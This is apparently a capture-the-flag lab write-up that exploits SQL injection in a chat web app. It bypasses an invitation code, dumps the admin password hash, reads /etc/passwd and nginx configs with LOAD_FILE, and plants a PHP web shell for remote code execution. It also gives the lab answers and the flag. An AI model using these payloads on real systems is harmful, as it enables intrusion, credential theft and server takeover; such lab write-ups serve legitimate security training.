# Question 1

## What is the password hash for the user `admin`?

We can try checking for SQL injection on the `login.php` page by submitting various escape characters, but nothing seems to work.

After some digging around, I found that it is possible to bypass the invitation code during account registration. To do this, we need to intercept the request using a proxy such as:

- Burp Suite
- OWASP ZAP

### Registration Form

```text
hacker : Test1234!
```

Capture the registration request and modify the invitation code parameter:

```http
username=aaa&password=Test1234%21&repeatPassword=Test1234%21&invitationCode=aaaa-bbbb-1111' or '1'='1
```

We can see that the account is successfully created and we can now log in.

---

## Finding the SQL Injection

The only promising location appears to be the search field.

To test for SQL injection, send messages containing special characters and then search for them.

A single quote (`'`) causes unexpected behavior, indicating a possible SQL injection vulnerability.

After determining the correct number of columns and identifying which column is reflected, the following payload works:

```sql
admin') union select 1,2,3,4-- -
```

This tells us that:

```text
Column 3 is reflected in the output.
```

---

## Database Enumeration

### Current Database Name

```sql
admin') union select 1,2,database(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

### Enumerate Tables

```sql
admin') union select 1,2,TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
```

One of the discovered tables is:

```text
Users
```

### Enumerate Columns

```sql
admin') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```

### Extract Admin Password Hash

```sql
admin') union select 1,2,Password,4 from Users where Username="admin"-- -
```

### Answer

```text
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

# Question 2

## What is the root path of the web application?

First, determine which database user is executing our queries.

### Current Database User

```sql
admin') union select 1,2,user(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Result:

```text
chattr_dbUser@localhost
```

---

## Check FILE Privilege

```sql
cn') UNION SELECT 1,2,privilege_type,grantee FROM information_schema.user_privileges-- -
```

This confirms that the database user has the:

```text
FILE
```

privilege.

---

## Determine Operating System

Attempt to read:

```text
/etc/passwd
```

using:

```sql
cn') UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -
```

Successful output confirms:

```text
Linux
```

---

## Read Web Server Configuration

Try reading common configuration files.

### Nginx Configuration

```sql
cn') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
```

The output indicates that site configurations are loaded from:

```text
/etc/nginx/sites-enabled/
```

---

## Fuzz Configuration Files

Capture a request and replace the filename with `FUZZ`.

Example:

```sql
cn') union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/FUZZ'),4-- -
```

Use ffuf:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -request conf.req -fs 5369
```

Discovered file:

```text
default
```

Read it:

```sql
cn') union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
```

### Answer

```text
/var/www/chattr-prod
```

# Question 3

## Achieve Remote Code Execution and Retrieve the Flag

Before writing files, verify the required conditions.

### Requirements

```text
1. FILE privilege enabled
2. secure_file_priv not restricting file writes
3. Write access to target directory
```

We already confirmed that the FILE privilege exists.

---

## Determine DBMS

```sql
cn') union select 1,2,@@version,4-- -
```

Result:

```text
MariaDB
```

---

## Check secure_file_priv

```sql
cn') union select 1,2,variable_value,4
from information_schema.global_variables
where variable_name="secure_file_priv"-- -
```

Result:

```text
(empty)
```

This means file reads and writes are allowed.

---

## Write a PHP Web Shell

Use:

```sql
cn') union select "",
'<?php system($_REQUEST[0]); ?>',
"",
""
into outfile '/var/www/chattr-prod/shell.php'-- -
```

This creates:

```text
/var/www/chattr-prod/shell.php
```

---

## Execute Commands

Access:

```text
https://<IP>:<PORT>/shell.php?0=id
```

Parameter:

```text
0
```

contains the command to execute.

At this point, remote code execution is achieved.

A reverse shell can also be spawned if desired.

---

## Retrieve the Flag

The flag is located in:

```text
/
```

Read the flag file from the root directory.

### Answer

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```
